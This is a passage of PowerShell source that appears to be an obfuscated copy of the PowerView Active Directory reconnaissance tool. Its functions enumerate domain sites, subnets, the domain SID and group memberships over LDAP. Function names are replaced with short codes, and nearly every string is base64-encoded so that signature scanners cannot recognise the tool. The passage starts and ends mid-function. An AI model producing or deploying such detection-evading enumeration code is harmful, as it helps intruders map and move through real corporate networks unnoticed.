        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${412} = f74 @48
    }
    PROCESS {
        if (${412}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewAyADUANAB9ACcAIABmAHIAbwBtACAAJwAkAHsAMgA1ADIAfQAnAA==')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${412} = f74 @48
                        if (-not ${412}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7ADIANQA0AH0AJwA=')))
                        }
                    }
                }
                else {
                    try {
                        ${253} = (-Join (([Guid]${252}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                    }
                    catch {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQA=')))
                    }
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABzAGkAdABlAHMAIAB3AGkAdABoACAAJAB7AGYAMgA2AH0AIABzAGUAdAAgAGkAbgAgAHQAaABlACAAZwBwAEwAaQBuAGsAIABwAHIAbwBwAGUAcgB0AHkA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AGYAMgA2AH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${412}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACQARgBpAGwAdABlAHIAKQA=')))
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $(${412}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${412}.FindAll() }
            else { ${72} = ${412}.FindAll() }
            ${72} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${413} = $_
                }
                else {
                    ${413} = f104 -Properties $_.Properties
                }
                ${413}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                ${413}
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQA')))
                }
            }
            ${412}.dispose()
        }
    }
}
function Get-DomainSubnet {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${410} = f74 @48
    }
    PROCESS {
        if (${410}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAMgA1ADQAfQAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${410} = f74 @48
                        if (-not ${410}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAyADUANAB9ACcA')))
                        }
                    }
                }
                else {
                    try {
                        ${253} = (-Join (([Guid]${252}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                    }
                    catch {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQA=')))
                    }
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${410}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $(${410}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${410}.FindOne() }
            else { ${72} = ${410}.FindAll() }
            ${72} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${411} = $_
                }
                else {
                    ${411} = f104 -Properties $_.Properties
                }
                ${411}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                    if (${411}.properties -and (${411}.properties.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA=='))))) {
                        ${411}
                    }
                    elseif (${411}.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA==')))) {
                        ${411}
                    }
                }
                else {
                    ${411}
                }
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${410}.dispose()
        }
    }
}
function f73 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${48} = @{
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${409} = f79 @48 -FindOne | select -First 1 -ExpandProperty objectsid
    if (${409}) {
        ${409}.SubString(0, ${409}.LastIndexOf('-'))
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMASQBEAF0AIABFAHIAcgBvAHIAIABlAHgAdAByAGEAYwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABTAEkARAAgAGYAbwByACAAJwAkAEQAbwBtAGEAaQBuACcA')))
    }
}
function f70 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${f22},
        [Switch]
        ${f25},
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${f24},
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${f23},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${386} = f74 @48
    }
    PROCESS {
        if (${386}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if (${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${256} = ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${f22}
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                f98 @48 | % {
                    ${408} = $_.GetDirectoryEntry()
                    ${408}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    ${408}.TokenGroups | % {
                        ${242} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if (${242} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${242}
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $False
                            if (${256}) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${256} }
                            ${212} = f98 @48
